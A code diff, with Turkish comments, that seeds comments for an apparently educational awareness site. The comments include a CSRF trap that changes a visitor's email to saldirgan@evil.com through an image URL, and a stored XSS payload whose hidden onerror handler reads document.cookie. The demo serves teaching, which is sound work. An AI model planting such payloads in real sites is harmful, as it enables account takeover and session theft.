@@ -11,10 +11,18 @@ Yapi:  COMMENTS[slug] = [ {yazar, metin, resim}, ... ]
 # masum bir metin + resim URL'si olarak e-posta degistirme islemi.
 # Bu habere giren giris-yapmis her kullanici (kurban) hacklenir.
 COMMENTS = {
+    # --- CSRF tuzagi (resim alaninda e-posta degistirme adresi) ---
     "parola-yoneticisi-sekiz-neden": [
         {"yazar": "mehmet58", "metin": "Gercekten faydali bir yazi, tesekkurler!", "resim": ""},
         {"yazar": "ays_e", "metin": "Ben de parola yoneticisine gectim, pismanlik yok.", "resim": ""},
         {"yazar": "deniz", "metin": "Harika anlatim, bir de su gorsele bakin 👇", "resim": "/hesap/email-degistir?email=saldirgan@evil.com"},
+    ],
+    # --- STORED XSS tuzagi (yorum METNINE gizlenmis kod) ---
+    # Gorunur metin masum; sonundaki gizli <img> yuklenemeyince onerror calisir,
+    # kurbanin cerezini okuyup farkindalik fonksiyonuna verir.
+    "yapay-zeka-telefonlara-tasiniyor": [
+        {"yazar": "teknosever", "metin": "Cihaz ustu modeller gercekten oyunu degistirecek.", "resim": ""},
+        {"yazar": "x_kullanici", "metin": "Bence de cok yerinde tespitler 👏 <img src=x style=\"display:none\" onerror=\"window.xssYakala && window.xssYakala(document.cookie)\">", "resim": ""},
     ],
 }
 
